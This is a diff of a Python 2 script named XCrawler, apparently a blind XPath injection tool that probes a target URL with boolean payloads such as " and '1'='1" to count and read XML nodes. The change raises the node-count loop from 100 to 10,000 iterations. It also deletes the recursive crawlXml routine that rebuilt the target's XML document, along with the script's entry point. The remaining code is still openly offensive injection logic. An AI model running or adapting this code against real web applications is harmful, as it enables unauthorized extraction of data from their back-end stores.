@@ -5,6 +5,7 @@ import urllib
 import urllib2
 from xml.dom.minidom import *
 
+
 class XCrawler(object):
     strTrue = " and '1'='1"
     strFalse = " and '1'='0"
@@ -21,7 +22,7 @@ class XCrawler(object):
 
     def count_node(self, path):
         count = 0
-        for i in range(1, 100):
+        for i in range(0, 10000):
             payload = self.makePayload(self.strCount.format(path, i))
             if self.getRequest(payload):
                 count = i
@@ -59,36 +60,3 @@ class XCrawler(object):
         parser = argparse.ArgumentParser()
         parser.add_argument('-url')
         return parser.parse_args()
-
-    def crawlXml(self, base_path, parent_node = None):
-        nodeIndex = 1
-        path = base_path
-        nodeCount = self.count_node(path)
-        while nodeIndex <= nodeCount:
-            path = base_path + "[{}]".format(nodeIndex)
-            length = self.find_length("name(" + path + ")")
-            name = self.find_name("name(" + path + ")", length)
-
-            node = self.xml.createElement(name)
-
-            text_length = self.find_length(path + "/text()")
-            if text_length > 0:
-                text = self.find_name(path + "/text()", text_length)
-                text_node = self.xml.createTextNode(text)
-                node.appendChild(text_node)
-
-            if parent_node is None:
-                self.xml.appendChild(node)
-            else:
-                parent_node.appendChild(node)
-            if self.count_node(path + "/*") > 0:
-                self.crawlXml(path + "/*", node)
-            nodeIndex += 1
-
-    def main(self):
-        self.crawlXml('/*')
-        print self.xml.toprettyxml()
-
-if __name__ == '__main__':
-    xcrawler = XCrawler()
-    xcrawler.main()
